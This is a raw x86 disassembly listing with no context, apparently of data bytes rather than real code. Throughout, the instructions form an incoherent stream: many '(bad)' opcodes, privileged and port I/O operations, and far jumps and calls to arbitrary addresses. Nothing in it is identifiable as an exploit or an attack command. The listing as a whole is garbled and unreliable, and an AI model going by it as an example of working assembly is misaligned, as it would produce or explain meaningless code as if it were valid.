  41233a:	xor    DWORD PTR [edi-0x36],esp
  41233d:	std    
  41233e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41233f:	inc    eax
  412340:	jo     0x41232e
  412342:	ss mov esi,0xecdfa604
  412348:	pop    ds
  412349:	sbb    eax,0x754d6c26
  41234e:	xchg   ebx,eax
  41234f:	cs neg edi
  412352:	push   esi
  412353:	sub    al,0xe5
  412355:	mov    ds:0x9450f08c,eax
  41235a:	mov    ebp,0x30d39fea
  41235f:	dec    BYTE PTR [edi-0xc04819]
  412365:	dec    eax
  412366:	test   DWORD PTR [edx-0x4ef2fc5e],edx
  41236c:	mov    eax,ds:0xb36ba6e8
  412371:	lods   al,BYTE PTR ds:[esi]
  412372:	sbb    BYTE PTR [edi+ebx*2+0x5e],ch
  412376:	sbb    ecx,DWORD PTR [edx-0x5dba72fd]
  41237c:	fstp   QWORD PTR [ebx+0x41008671]
  412382:	sbb    cl,BYTE PTR [eax+0x1e]
  412385:	sar    DWORD PTR [edi],cl
  412387:	inc    esp
  412388:	mov    esp,0x848ccd2d
  41238d:	retf   0xb094
  412390:	enter  0x3691,0x4a
  412394:	adc    al,0xf7
  412396:	aam    0x43
  412398:	int    0x2
  41239a:	mov    ch,0xbe
  41239c:	mov    esi,0x2ece48ab
  4123a1:	ins    DWORD PTR es:[edi],dx
  4123a2:	mov    eax,DWORD PTR [ebx+0x47ab9fb6]
  4123a8:	xor    esi,DWORD PTR [ecx+0x50]
  4123ab:	sahf   
  4123ac:	xor    BYTE PTR [edi-0x54863e96],bl
  4123b2:	mov    DWORD PTR [edx-0x17bd7baf],0x47966235
  4123bc:	mov    al,ds:0xb4710df
  4123c1:	in     al,0x78
  4123c3:	xchg   ebp,eax
  4123c4:	imul   ebx
  4123c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123c7:	out    0xcd,al
  4123c9:	js     0x4123aa
  4123cb:	in     al,0x2b
  4123cd:	rol    BYTE PTR [eax+0x463b84f],cl
  4123d3:	sbb    al,0x2a
  4123d5:	dec    esi
  4123d6:	mov    cs,WORD PTR [ecx]
  4123d8:	aaa    
  4123d9:	ror    DWORD PTR [eax+0x74],cl
  4123dc:	in     eax,0x8
  4123de:	xchg   BYTE PTR [eax+0x4499353b],ah
  4123e4:	dec    ebp
  4123e5:	fcom   st(0)
  4123e7:	fisubr WORD PTR [edx]
  4123e9:	push   ebx
  4123ea:	cli    
  4123eb:	push   edi
  4123ec:	fisub  WORD PTR [esi-0x58]
  4123ef:	jg     0x412386
  4123f1:	addr16 mov al,ds:0xb1d8
  4123f5:	sbb    al,bl
  4123f7:	push   ecx
  4123f8:	dec    edx
  4123f9:	scas   al,BYTE PTR es:[edi]
  4123fa:	imul   ebp,DWORD PTR [ebx+0x6fc1df51],0x3b16c6d
  412404:	inc    esp
  412405:	inc    ebx
  412406:	cli    
  412407:	jge    0x4123d8
  412409:	mov    dh,0x38
  41240b:	inc    esp
  41240c:	dec    edi
  41240d:	stc    
  41240e:	or     ecx,edx
  412410:	adc    ecx,DWORD PTR [ecx+0x55ed69c3]
  412416:	in     eax,0x77
  412418:	adc    ebp,0x3e
  41241b:	jg     0x412481
  41241d:	mov    eax,ds:0x360ff5b3
  412422:	pop    esp
  412423:	pop    ecx
  412424:	and    DWORD PTR [ebx-0x3b],edi
  412427:	lds    ebp,FWORD PTR [esi+0xa]
  41242a:	mov    edi,0xf2d7c203
  41242f:	jns    0x41246c
  412431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412432:	xor    eax,eax
  412434:	xor    BYTE PTR [edx],cl
  412436:	mov    esp,edi
  412438:	stos   DWORD PTR es:[edi],eax
  412439:	cmc    
  41243a:	dec    ebx
  41243b:	stos   BYTE PTR es:[edi],al
  41243c:	sbb    ah,BYTE PTR [edi+0x53394794]
  412442:	lods   al,BYTE PTR ds:[esi]
  412443:	ret    
  412444:	nop
  412445:	test   edx,esp
  412447:	inc    ebp
  412448:	adc    al,0x68
  41244a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41244c:	cli    
  41244d:	mul    BYTE PTR [ecx+0x59ef2979]
  412453:	xchg   ecx,eax
  412454:	mov    edi,0x4aa8ab90
  412459:	(bad)  
  41245b:	pop    ss
  41245c:	xor    al,0xe6
  41245e:	in     eax,dx
  41245f:	mov    dl,0x58
  412461:	and    DWORD PTR ds:0xc5f3101c,edi
  412467:	adc    DWORD PTR [esi+0x222dce48],edi
  41246d:	adc    DWORD PTR [ebx+0x26],ebx
  412470:	and    dh,BYTE PTR [esp+eax*1]
  412473:	mul    BYTE PTR [edi-0x3c]
  412476:	retf   0xde88
  412479:	dec    ebp
  41247a:	psrlq  mm2,QWORD PTR [ecx-0x7e]
  41247e:	jge    0x4124d2
  412480:	fs pop ds
  412482:	mov    edi,0xb6a6f931
  412487:	fwait
  412488:	stos   BYTE PTR es:[edi],al
  412489:	adc    al,BYTE PTR [ebp-0x4b]
  41248c:	add    ah,dh
  41248e:	les    eax,FWORD PTR [edx+0x72]
  412491:	in     eax,0x8f
  412493:	mov    bl,0x5b
  412495:	sbb    ah,BYTE PTR [eax-0x2b47f509]
  41249b:	adc    BYTE PTR [ebx],cl
  41249d:	mov    eax,0xff1d36ad
  4124a2:	cmp    ah,BYTE PTR [ebx-0x5b6b93e2]
  4124a8:	into   
  4124a9:	shl    DWORD PTR ds:[esi-0x3e76ba42],0xe6
  4124b1:	cld    
  4124b2:	in     eax,0xf0
  4124b4:	sub    al,BYTE PTR [edx]
  4124b6:	clc    
  4124b7:	dec    edx
  4124b8:	inc    ecx
  4124b9:	in     eax,dx
  4124ba:	es (bad) 
  4124bc:	push   esp
  4124bd:	cmp    dh,al
  4124bf:	add    BYTE PTR [ecx-0x5274a3a4],bh
  4124c5:	dec    eax
  4124c6:	mov    cl,0xb9
  4124c8:	xor    BYTE PTR [ebx],bh
  4124ca:	popa   
  4124cb:	push   ss
  4124cc:	ins    BYTE PTR es:[edi],dx
  4124cd:	inc    BYTE PTR [eax]
  4124cf:	pop    edi
  4124d0:	(bad)  
  4124d2:	ffreep st(6)
  4124d4:	repz cmp eax,0x20cb4c53
  4124da:	cmp    BYTE PTR [ebp-0x62f53c43],bl
  4124e0:	mov    dh,0xef
  4124e2:	jp     0x412560
  4124e4:	fwait
  4124e5:	inc    esp
  4124e6:	adc    al,0xcc
  4124e8:	cmp    esi,DWORD PTR [ebx+0x6c]
  4124eb:	mov    esp,cs
  4124ed:	and    al,BYTE PTR [ecx-0x2a]
  4124f0:	ja     0xfc42b3df
  4124f6:	dec    ecx
  4124f7:	pusha  
  4124f8:	push   ds
  4124f9:	cmp    BYTE PTR [esi],dh
  4124fb:	jbe    0x41252c
  4124fd:	push   ebx
  4124fe:	and    ah,BYTE PTR [edi-0x65]
  412501:	push   0x78
  412503:	int3   
  412504:	inc    BYTE PTR [ebp+0x26]
  412507:	imul   edi,DWORD PTR [ecx],0xa80ef467
  41250d:	xchg   esi,eax
  41250e:	scas   eax,DWORD PTR es:[edi]
  41250f:	fwait
  412510:	stos   DWORD PTR es:[edi],eax
  412511:	lods   eax,DWORD PTR ds:[esi]
  412512:	jp     0x41257f
  412514:	mov    ds:0xa2532503,al
  412519:	push   ebp
  41251a:	(bad)  
  41251b:	lahf   
  41251c:	add    BYTE PTR [edi-0x71a40c12],ch
  412522:	or     dh,BYTE PTR [ebx]
  412524:	mov    ah,0x8b
  412526:	stc    
  412527:	or     eax,ebp
  412529:	retf   
  41252a:	and    esi,DWORD PTR [eax+ebx*2+0x1]
  41252e:	dec    esi
  41252f:	invd   
  412531:	push   ss
  412532:	retf   0xa5f3
  412535:	or     bl,bl
  412537:	pushf  
  412538:	inc    esp
  412539:	push   ebx
  41253a:	ds push ecx
  41253c:	leave  
  41253d:	mov    ds:0xe94b1c71,al
  412542:	xor    eax,0xf1154e32
  412547:	pop    bx
  412549:	mov    cl,0xf9
  41254b:	lea    edx,[edi-0x1f]
  41254e:	test   eax,0x7d3a3914
  412553:	mov    DWORD PTR [esi+edi*8],esp
  412556:	dec    edi
  412557:	jnp    0x41255a
  412559:	jbe    0x412518
  41255b:	mov    esp,0x1e0c6e10
  412560:	inc    ebx
  412561:	in     al,0x57
  412563:	out    0x95,al
  412565:	out    dx,eax
  412566:	frndint 
  412568:	outs   dx,BYTE PTR ds:[esi]
  412569:	add    DWORD PTR [esi+0x299d56da],esi
  41256f:	fs push ecx
  412571:	xor    esp,DWORD PTR [ebp+0x7b2a3d37]
  412577:	stc    
  412578:	(bad)  
  412579:	mov    cl,0xf8
  41257b:	mov    ecx,0x342421c9
  412580:	pop    edx
  412581:	inc    edi
  412582:	leave  
  412583:	add    eax,0x9017111f
  412588:	fidivr WORD PTR [ecx+0x6a]
  41258b:	mov    eax,ds:0x2287219e
  412590:	and    DWORD PTR [ebp+0x3585e758],0xffffffb4
  412597:	scas   eax,DWORD PTR es:[edi]
  412598:	out    dx,al
  412599:	int3   
  41259a:	xchg   ecx,eax
  41259b:	or     bl,BYTE PTR [edi-0x40e044b7]
  4125a1:	sub    eax,0xb2bddedf
  4125a6:	mov    dl,0xe8
  4125a8:	in     al,dx
  4125a9:	bndstx [eax],bnd1
  4125ac:	loope  0x412599
  4125ae:	pushf  
  4125af:	inc    esi
  4125b0:	scas   al,BYTE PTR es:[edi]
  4125b1:	lods   eax,DWORD PTR ds:[esi]
  4125b2:	and    esp,edx
  4125b4:	mov    dh,al
  4125b6:	or     DWORD PTR [ecx+0x60],esp
  4125b9:	lock jl 0x4125b8
  4125bc:	and    BYTE PTR [edi],bl
  4125be:	(bad)
  4125c1:	sbb    dl,0xe6
  4125c4:	xor    BYTE PTR [ecx],dh
  4125c6:	not    ecx
  4125c8:	jmp    0x7eb77bd1
  4125cd:	mov    eax,0xb8a321c8
  4125d2:	into   
  4125d3:	mov    ds:0x32920139,eax
  4125d8:	push   0xffffff8a
  4125da:	lea    ebx,[edi+0x4751bd41]
  4125e0:	lahf   
  4125e1:	and    al,0xf
  4125e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125e4:	stc    
  4125e5:	or     bh,bl
  4125e7:	das    
  4125e8:	push   es
  4125e9:	out    0xec,eax
  4125eb:	jl     0x964dd44b
  4125f1:	xor    DWORD PTR [esi-0x21d04e77],ebx
  4125f7:	jne    0x4125b5
  4125f9:	and    bl,bh
  4125fb:	lahf   
  4125fc:	test   al,0x4e
  4125fe:	mov    ebx,0xe48e00f6
  412603:	pop    edx
  412604:	ret    0xd838
  412607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412608:	fisubr WORD PTR [ebx+0x5463a11f]
  41260e:	(bad)  
  41260f:	cli    
  412610:	add    edi,DWORD PTR [esi-0x3b5d545a]
  412616:	push   esi
  412617:	xchg   ecx,eax
  412618:	lea    edi,[ebp-0x3b5c184f]
  41261e:	adc    edi,DWORD PTR [ebx+0x31]
  412621:	push   edi
  412622:	hlt    
  412623:	jno    0x41261a
  412625:	push   ss
  412626:	xchg   edx,eax
  412627:	icebp  
  412628:	mov    ah,0x59
  41262a:	clc    
  41262b:	adc    al,ch
  41262d:	stos   BYTE PTR es:[edi],al
  41262e:	push   ds
  41262f:	push   es
  412630:	aam    0x1d
  412632:	dec    ecx
  412633:	rcr    BYTE PTR [eax-0x54],cl
  412636:	adc    DWORD PTR [esi*4+0xf6fdc71],edx
  41263d:	inc    ecx
  41263e:	adc    eax,0x103363ce
  412643:	daa    
  412644:	jp     0x412610
  412646:	and    ebx,DWORD PTR [ecx-0x170fb0d0]
  41264c:	lods   al,BYTE PTR ds:[esi]
  41264d:	fimul  WORD PTR [edx+0x61]
  412650:	(bad)  
  412651:	adc    al,0xd3
  412653:	or     ecx,DWORD PTR [ebx]
  412655:	xchg   esi,eax
  412656:	lock xchg DWORD PTR [edi],esi
  412659:	jmp    0x41269a
  41265b:	data16 (bad) 
  41265d:	fisub  DWORD PTR [esi+0x46]
  412660:	xor    al,0x55
  412662:	jge    0x41262b
  412664:	add    BYTE PTR [ecx-0x57],bl
  412667:	mov    esp,0xbfbcae68
  41266c:	pop    ds
  41266d:	mov    ebp,0xa016aaac
  412672:	in     eax,0x77
  412674:	js     0x4126a1
  412676:	push   esp
  412677:	imul   DWORD PTR [ebx+eax*4-0x7]
  41267b:	jle    0x4126d6
  41267d:	popa   
  41267e:	jb     0x4126b1
  412680:	xor    al,0x2b
  412682:	sub    eax,0x30bb4dc4
  412687:	push   esp
  412688:	iret   
  412689:	iret   
  41268a:	es jo  0x41261d
  41268d:	jb     0x4126cb
  41268f:	rcr    DWORD PTR [ebx+0x29],cl
  412692:	pop    ecx
  412693:	pop    esp
  412694:	xchg   esp,eax
  412695:	cs (bad) 
  412697:	out    dx,al
  412698:	sti    
  412699:	sar    eax,0xed
  41269c:	xor    al,0xb4
  41269e:	jmp    0xfc33:0x2e643cc8
  4126a5:	add    bl,al
  4126a7:	fst    QWORD PTR [eax-0x137933f0]
  4126ad:	add    esi,DWORD PTR [ebx]
  4126af:	cmp    BYTE PTR [eax-0x965e18e],bl
  4126b5:	fcmovnu st,st(2)
  4126b7:	push   ss
  4126b8:	sub    BYTE PTR [edi],cl
  4126ba:	ins    BYTE PTR es:[edi],dx
  4126bb:	jmp    0x37d4a8fd
  4126c0:	or     DWORD PTR [esi+0x2e5b415b],ecx
  4126c6:	inc    eax
  4126c7:	enter  0xaede,0xa2
  4126cb:	shr    BYTE PTR [ebx],0x20
  4126ce:	enter  0x5645,0xc3
  4126d2:	je     0x41269d
  4126d4:	pop    es
  4126d5:	cwde   
  4126d6:	or     DWORD PTR [edi+0x3],edi
  4126d9:	push   ds
  4126da:	repz cld 
  4126dc:	adc    dh,BYTE PTR [ecx-0x7f23ea52]
  4126e2:	jmp    0x46922a25
  4126e7:	hlt    
  4126e8:	iret   
  4126e9:	hlt    
  4126ea:	test   BYTE PTR [eax+0x47589c8f],dh
  4126f0:	mov    esi,0xabcf52ce
  4126f5:	or     DWORD PTR [edx+ebx*4],0x6c
  4126f9:	xchg   edi,eax
  4126fa:	loope  0x4126b8
  4126fc:	pop    ebp
  4126fd:	sub    bh,dh
  4126ff:	test   DWORD PTR [esi-0x33b785bf],edi
  412705:	fdivr  st(1),st
  412707:	int3   
  412708:	jg     0x41277e
  41270a:	call   0x72c697d9
  41270f:	adc    ah,BYTE PTR [ebx+edi*8]
  412712:	sub    ebx,edi
  412714:	push   edx
  412715:	push   ds
  412716:	xchg   edi,eax
  412717:	rcr    BYTE PTR [ebx+0x2d74091c],0x58
  41271e:	sub    al,0xcb
  412720:	ins    BYTE PTR es:[edi],dx
  412721:	arpl   WORD PTR [edx],di
  412723:	ss scas eax,DWORD PTR es:[edi]
  412725:	xor    bl,BYTE PTR [ecx-0x32e9f38e]
  41272b:	cmp    esp,esi
  41272d:	loope  0x412761
  41272f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412730:	sub    esp,0x6b
  412733:	ins    DWORD PTR es:[edi],dx
  412734:	pusha  
  412735:	ss loope 0x4126c3
  412738:	sub    BYTE PTR [ebp+ecx*4+0x4f],bh
  41273c:	inc    ecx
  41273d:	xchg   ecx,eax
  41273e:	push   ebp
  41273f:	ins    BYTE PTR es:[edi],dx
  412740:	push   ebp
  412741:	inc    esi
  412742:	cdq    
  412743:	mov    esp,0x491cbd4b
  412748:	adc    ebp,DWORD PTR [esi]
  41274a:	pop    esi
  41274b:	enter  0x57d6,0x24
  41274f:	icebp  
  412750:	and    ch,BYTE PTR [ebp+0x51]
  412753:	push   cs
  412754:	mov    edi,0x99aece21
  412759:	inc    BYTE PTR [esp+eiz*4+0x3b]
  41275d:	and    eax,0xe4ec6654
  412762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412763:	mov    eax,0x5e952cb3
  412768:	sbb    eax,0xe94558d8
  41276d:	mov    edi,ss
  41276f:	fidiv  DWORD PTR [ebx-0x591281e7]
  412775:	jb     0x4127d2
  412777:	dec    ebx
  412778:	inc    eax
  412779:	or     DWORD PTR [ecx],ecx
  41277b:	add    cl,BYTE PTR [esi]
  41277d:	mov    ah,0xd6
  41277f:	inc    edx
  412780:	jle    0x412795
  412782:	sbb    al,0xf5
  412784:	je     0x4127c5
  412786:	xor    DWORD PTR [eax-0x5e],edi
  412789:	fild   DWORD PTR [ebx-0x37]
  41278c:	mov    ds:0x37d8d8cb,eax
  412791:	lea    ebx,[edi]
  412793:	or     dh,bh
  412795:	lods   al,BYTE PTR ds:[esi]
  412796:	ret    
  412797:	and    al,0x32
  412799:	nop
  41279a:	loopne 0x4127f8
  41279c:	cs out 0x42,al
  41279f:	push   cs
  4127a0:	push   es
  4127a1:	mov    eax,0xb6e0b75
  4127a6:	cli    
  4127a7:	js     0x4127f2
  4127a9:	out    0xec,eax
  4127ab:	test   al,0xb1
  4127ad:	mov    bh,0x44
  4127af:	psrld  mm6,QWORD PTR [esi-0x35]
  4127b3:	jecxz  0x412817
  4127b5:	in     eax,dx
  4127b6:	mov    esp,0x1bcd2b38
  4127bb:	mov    ch,ch
  4127bd:	stos   BYTE PTR es:[edi],al
  4127be:	out    0xef,al
  4127c0:	jo     0x4127ba
  4127c2:	or     eax,0x754bbe6b
  4127c7:	pop    es
  4127c8:	xor    al,0xea
  4127ca:	es test eax,0xa8821b8d
  4127d0:	push   edx
  4127d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127d2:	mov    edx,DWORD PTR fs:[ecx]
  4127d5:	out    0xdc,eax
  4127d7:	(bad)  
  4127d8:	loope  0x41281c
  4127da:	iret   
  4127db:	xlat   BYTE PTR ds:[ebx]
  4127dc:	inc    esi
  4127dd:	js     0x412786
  4127df:	mov    al,0x17
  4127e1:	out    0xf1,al
  4127e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e4:	stos   BYTE PTR es:[edi],al
  4127e5:	mul    cl
  4127e7:	rcl    DWORD PTR [edi+0x4485a942],1
  4127ed:	outs   dx,DWORD PTR ds:[esi]
  4127ee:	out    dx,al
  4127ef:	push   ebp
  4127f0:	xchg   ebx,eax
  4127f1:	jmp    0x412794
  4127f3:	dec    esi
  4127f4:	push   edx
  4127f5:	addr16 or esp,esp
  4127f8:	xchg   edx,eax
  4127f9:	inc    esi
  4127fa:	or     BYTE PTR [ecx+0x28],0xc6
  4127fe:	pop    ecx
  4127ff:	stos   BYTE PTR es:[edi],al
  412800:	stc    
  412801:	mov    edx,?
  412803:	fnstsw WORD PTR [edx-0x7088b08a]
  412809:	inc    ebp
  41280a:	push   esp
  41280b:	jg     0x412800
  41280d:	push   ebx
  41280e:	fwait
  41280f:	iret   
  412810:	out    0x2f,eax
  412812:	mov    ah,0xb1
  412814:	and    al,0xd
  412816:	(bad)  
  412817:	or     eax,0xb0cd70ab
  41281c:	ret    0xbf04
  41281f:	jl     0x412861
  412821:	dec    edi
  412822:	outs   dx,BYTE PTR ds:[esi]
  412823:	xchg   ebx,eax
  412824:	adc    eax,DWORD PTR [ebx*8+0xc36975]
  41282b:	outs   dx,BYTE PTR ds:[esi]
  41282c:	add    al,0x62
  41282e:	dec    edi
  41282f:	cld    
  412830:	or     al,0x95
  412832:	(bad)  
  412833:	into   
  412834:	xchg   BYTE PTR ds:0x73c10aef,cl
  41283a:	arpl   cx,cx
  41283c:	adc    bh,dh
  41283e:	mov    edx,DWORD PTR [edi]
  412840:	inc    ecx
  412841:	xor    edi,DWORD PTR [eax]
  412843:	fisubr DWORD PTR [eax]
  412845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412846:	xor    BYTE PTR [ebx-0xc9bc3ed],bh
  41284c:	(bad)  
  41284d:	stos   DWORD PTR es:[edi],eax
  41284e:	das    
  41284f:	call   0x735d:0x673581d7
  412856:	fmul   QWORD PTR [ebp+0x3f]
  412859:	fs push edi
  41285b:	add    bl,ah
  41285d:	dec    ebx
  41285e:	jmp    0x8ec:0x98b0a6ec
  412865:	jl     0x412874
  412867:	dec    eax
  412868:	mov    esp,0xc285192c
  41286d:	pop    edi
  41286e:	ins    DWORD PTR es:[edi],dx
  41286f:	pop    ebx
  412870:	xchg   ebp,eax
  412871:	fwait
  412872:	cmp    ebp,DWORD PTR [edx+0x2ca19a98]
  412878:	push   edi
  412879:	dec    esi
  41287a:	add    BYTE PTR ds:0x649b281a,dh
  412880:	pop    esp
  412881:	into   
  412882:	xchg   esp,eax
  412883:	fbstp  TBYTE PTR [esi-0x75]
  412886:	cdq    
  412887:	out    dx,al
  412888:	scas   eax,DWORD PTR es:[edi]
  412889:	mov    ah,dl
  41288b:	sub    cl,BYTE PTR [eax]
  41288d:	pop    ebx
  41288e:	push   0x69
  412890:	cld    
  412891:	mov    ebp,0xb5534866
  412896:	in     al,0x51
  412898:	sar    DWORD PTR [ebx+0x68a3aba1],0x45
  41289f:	xchg   ebp,eax
  4128a0:	or     BYTE PTR [eax],ah
  4128a2:	or     al,0xac
  4128a4:	cmp    DWORD PTR [edx],ebx
  4128a6:	inc    ecx
  4128a7:	xchg   DWORD PTR [esi],esp
  4128a9:	add    eax,0xf4fd838
  4128ae:	pushf  
  4128af:	popa   
  4128b0:	xchg   bl,bl
  4128b2:	das    
  4128b3:	addr16 mov ds:0x8bcf,eax
  4128b7:	sbb    DWORD PTR [eax+eiz*1+0x2fb6ec9f],edi
  4128be:	ss gs xchg esp,eax
  4128c1:	ja     0x41293d
  4128c3:	aas    
  4128c4:	arpl   WORD PTR [ecx+0x76078a1e],ax
  4128ca:	test   eax,0xbbebe5ba
  4128cf:	dec    edi
  4128d0:	ss adc al,0xa9
  4128d3:	sbb    BYTE PTR [ebp-0x69],al
  4128d6:	(bad)
  4128d9:	sbb    eax,0x8f814c8c
  4128de:	jmp    0x17af64b7
  4128e3:	jmp    0x796f:0xb8358569
  4128ea:	(bad)  
  4128eb:	cmp    esi,DWORD PTR [eax+0x71f65a2]
  4128f1:	mov    ebx,0xf7ad60e1
  4128f6:	cmp    BYTE PTR [esp+eax*8-0x29],dl
  4128fa:	sub    ch,al
  4128fc:	shl    BYTE PTR ds:0x31e1e24d,1
  412902:	call   0x4e86a926
  412907:	loopne 0x412963
  412909:	push   ss
  41290a:	loope  0x41292a
  41290c:	mov    ds:0x2aae5609,al
  412911:	test   DWORD PTR [ebx],ebp
  412913:	sar    BYTE PTR [ebx],0x33
  412916:	(bad)  
  412917:	push   ebp
  412918:	out    0x3f,eax
  41291a:	jb     0x41292e
  41291c:	mov    esp,0x61f1101e
  412921:	out    dx,eax
  412922:	(bad)  
  412923:	aas    
  412924:	retf   0x42c9
  412927:	or     BYTE PTR [eax+0x61],ch
  41292a:	pop    ebp
  41292b:	push   ss
  41292c:	in     al,dx
  41292d:	mov    ebx,0xdd7432ab
  412932:	popa   
  412933:	jge    0x41297e
  412935:	js     0x41296c
  412937:	or     cl,BYTE PTR [ecx-0x233fbf11]
  41293d:	inc    eax
  41293e:	dec    esi
  41293f:	jl     0x41296c
  412941:	mov    ch,dl
  412943:	mov    edi,0xd386e7d8
  412948:	cmp    ebp,DWORD PTR [ebx-0x18]
  41294b:	mov    bl,0x14
  41294d:	sbb    al,0x8f
  41294f:	es lahf 
  412951:	lock scas eax,DWORD PTR es:[edi]
  412953:	mov    ecx,0xa644c175
  412958:	in     al,dx
  412959:	sub    al,0x16
  41295b:	xchg   edx,eax
  41295c:	scas   eax,DWORD PTR es:[edi]
  41295d:	scas   eax,DWORD PTR es:[edi]
  41295e:	retf   
  41295f:	addr16 cld 
  412961:	cmp    eax,0xc3cd3e30
  412966:	mov    eax,ds:0x85ddf4bf
  41296b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41296c:	dec    esp
  41296d:	cli    
  41296e:	push   es
  41296f:	dec    ecx
  412970:	jne    0x4129d3
  412972:	pop    ecx
  412973:	cmc    
  412974:	sub    BYTE PTR [ecx],ch
  412976:	cmp    al,0x8e
  412978:	mov    al,ds:0xeab200f9
  41297d:	test   al,0x4b
  41297f:	jl     0x41292e
  412981:	rol    DWORD PTR [ecx],1
  412983:	push   esi
  412984:	mov    ebp,0xd5b9ba02
  412989:	loop   0x412959
  41298b:	sbb    BYTE PTR [edx],0x5e
  41298e:	ret    0x698b
  412991:	mov    edx,0x6e90671e
  412996:	add    DWORD PTR [ecx+0x6ceaa733],eax
  41299c:	or     al,0x8d
  41299e:	inc    eax
  41299f:	xchg   DWORD PTR ds:0x4986f2ae,ecx
  4129a5:	pop    edi
  4129a6:	jno    0x41294c
  4129a8:	fcom   DWORD PTR [eax-0x556b61b0]
  4129ae:	(bad)  
  4129af:	push   edi
  4129b0:	dec    esp
  4129b1:	fiadd  DWORD PTR [ecx+0x6a99233]
  4129b7:	jmp    0x343726bd
  4129bc:	sbb    ch,BYTE PTR [esi+0x71d543e1]
  4129c2:	clc    
  4129c3:	adc    bh,BYTE PTR [eax]
  4129c5:	jns    0x412995
  4129c7:	dec    ebp
  4129c8:	scas   eax,DWORD PTR es:[edi]
  4129c9:	jp     0x412950
  4129cb:	push   ss
  4129cc:	jae    0x412993
  4129ce:	mov    esp,0x151e34e1
  4129d3:	mov    eax,0xbc2b9069
  4129d8:	jmp    0xdb97:0x29ec211b
  4129df:	ror    edi,cl
  4129e1:	mov    ah,0xdd
  4129e3:	pop    ecx
  4129e4:	jecxz  0x4129ea
  4129e6:	repnz mov dh,0xe5
  4129e9:	pop    ds
  4129ea:	xchg   esp,eax
  4129eb:	lea    ecx,[ebx-0x3a]
  4129ee:	mov    BYTE PTR [eax+0x6bdb4fda],ah
  4129f4:	pop    edx
  4129f5:	pop    esp
  4129f6:	push   ss
  4129f7:	and    DWORD PTR [eax-0x79824cc4],edi
  4129fd:	lea    esp,[ecx+ebp*4]
  412a00:	ret    
  412a01:	dec    esi
  412a02:	int    0xd3
  412a04:	pop    ebx
  412a05:	cmc    
  412a06:	icebp  
  412a07:	inc    ebp
  412a08:	dec    ecx
  412a09:	in     eax,dx
  412a0a:	push   es
  412a0b:	mov    al,0x32
  412a0d:	dec    ebp
  412a0e:	aam    0x5b
  412a10:	or     eax,0x614b5861
  412a15:	lock aad 0xff
  412a18:	push   0xfffffff9
  412a1a:	mov    ebp,0x60c38eaa
  412a1f:	xor    dh,bh
  412a21:	or     al,0x34
  412a23:	shr    BYTE PTR [edi-0x73],1
  412a26:	jmp    0x9005aa8d
  412a2b:	(bad)  
  412a2c:	mov    gs,WORD PTR [ebx]
  412a2e:	loop   0x412a52
  412a30:	jb     0x412a2d
  412a32:	(bad)  
  412a33:	sar    BYTE PTR [edi],1
  412a35:	jg     0x412a20
  412a37:	pushf  
  412a38:	mov    dh,0x18
  412a3a:	mov    ebp,0x25dacf92
  412a3f:	test   DWORD PTR [ebp-0x57057234],edx
  412a45:	sti    
  412a46:	xor    al,0x47
  412a48:	inc    ebp
  412a49:	adc    esi,DWORD PTR [edi+0x212ab490]
  412a4f:	cwde   
  412a50:	sub    eax,0x87951bfc
  412a55:	iret   
  412a56:	shl    DWORD PTR [ebx-0x38],cl
  412a59:	(bad)  
  412a5a:	adc    al,0x23
  412a5c:	test   al,0x90
  412a5e:	sbb    al,0xd2
  412a60:	stos   BYTE PTR es:[edi],al
  412a61:	loope  0x412ac9
  412a63:	push   es
  412a64:	pop    edi
  412a65:	(bad)  
  412a66:	lods   eax,DWORD PTR ds:[esi]
  412a67:	dec    ebp
  412a68:	pop    edx
  412a69:	xchg   ebx,eax
  412a6a:	cmp    BYTE PTR [edi],bl
  412a6c:	pop    ss
  412a6d:	dec    ebp
  412a6e:	and    eax,DWORD PTR ds:0xcf31408
  412a74:	jmp    0xd57c0d93
  412a79:	hlt    
  412a7a:	rcr    DWORD PTR [esi],cl
  412a7c:	fist   DWORD PTR [eax-0xa55364]
  412a82:	add    ch,bh
  412a84:	sub    dl,BYTE PTR [bx-0x60e3]
  412a89:	test   eax,0x2b49e782
  412a8e:	jl     0x412a69
  412a90:	fdivp  st(1),st
  412a92:	jno    0x412a6c
  412a94:	xchg   edx,eax
  412a95:	gs push eax
  412a97:	or     al,0x49
  412a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9a:	cmp    edx,edx
  412a9c:	mov    ?,WORD PTR [ebx-0x72059d7e]
  412aa2:	or     al,0xcb
  412aa4:	xor    BYTE PTR [ebx+0x1c],ch
  412aa7:	push   ebp
  412aa8:	adc    al,0xb3
  412aaa:	sub    BYTE PTR [ebp+0x2d0a1d83],bh
  412ab0:	sti    
  412ab1:	(bad)  
  412ab2:	shr    DWORD PTR [ebp+0x11],0x85
  412ab6:	add    edi,DWORD PTR [esi]
  412ab8:	push   cs
  412ab9:	pop    ss
  412aba:	sbb    bl,BYTE PTR [edi-0x20]
  412abd:	mov    ch,0xe5
  412abf:	lods   al,BYTE PTR ds:[esi]
  412ac0:	arpl   WORD PTR [esi-0x49],dx
  412ac3:	ins    BYTE PTR es:[edi],dx
  412ac4:	push   0xa
  412ac6:	data16 aaa 
  412ac8:	sub    ecx,DWORD PTR [edx-0x7f7d4cbc]
  412ace:	push   edx
  412acf:	shl    DWORD PTR [ebp+0x6b],0xab
  412ad3:	pop    esi
  412ad4:	cmp    esi,edi
  412ad6:	into   
  412ad7:	das    
  412ad8:	fild   WORD PTR [edi]
  412ada:	push   eax
  412adb:	mov    es,WORD PTR [edi-0x6e]
  412ade:	pop    ecx
  412adf:	in     eax,0x8f
  412ae1:	inc    ecx
  412ae2:	xor    dh,dh
  412ae4:	out    dx,al
  412ae5:	push   ds
  412ae6:	stc    
  412ae7:	xchg   esi,eax
  412ae8:	cmp    cl,BYTE PTR [ecx]
  412aea:	xchg   edx,eax
  412aeb:	add    DWORD PTR [ebx],esi
